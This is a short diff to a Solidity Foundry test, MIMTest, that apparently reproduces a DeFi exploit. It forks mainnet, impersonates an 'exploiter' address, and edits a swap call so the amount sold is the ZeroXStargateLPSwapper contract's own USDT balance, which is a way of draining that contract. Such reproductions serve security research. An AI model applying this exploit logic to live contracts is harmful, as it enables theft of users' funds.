@@ -52,7 +52,6 @@ contract MIMTest is Test {
 
     function setUp() public {
         cheats.createSelectFork("mainnet", 17521638);
-        deal(address(USDT), exploiter, 17975143719);
         deal(address(SUSDT), exploiter, 3e6);
         cheats.startPrank(exploiter);
         SUSDT.approve(address(this), type(uint256).max);
@@ -92,7 +91,7 @@ contract MIMTest is Test {
             address(MIM), // outputToken
             curveLiquidityProvider, // provider
             exploiter, // recipient
-            USDT.balanceOf(exploiter), // sellAmount
+            USDT.balanceOf(address(ZeroXStargateLPSwapper)), // sellAmount
             16_716_883_658_670_000_000_000, // minBuyAmount
             auxiliaryData // auxiliaryData
         );
